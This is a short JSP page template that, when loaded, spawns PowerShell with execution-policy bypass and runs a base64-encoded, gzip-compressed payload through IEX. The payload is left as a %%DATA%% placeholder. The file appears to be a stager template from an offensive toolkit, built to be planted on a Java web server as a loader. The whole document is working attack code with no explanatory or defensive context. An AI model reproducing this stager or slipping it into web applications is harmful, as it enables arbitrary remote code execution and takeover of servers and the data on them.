<%@ page import="java.io.*" %>
<%
   try {
      Process p = Runtime.getRuntime().exec("powershell -exec bypass -noni -nop -c \"$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('%%DATA%%'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\"");
   }
   catch(IOException e) {
      e.printStackTrace();
   }
%>

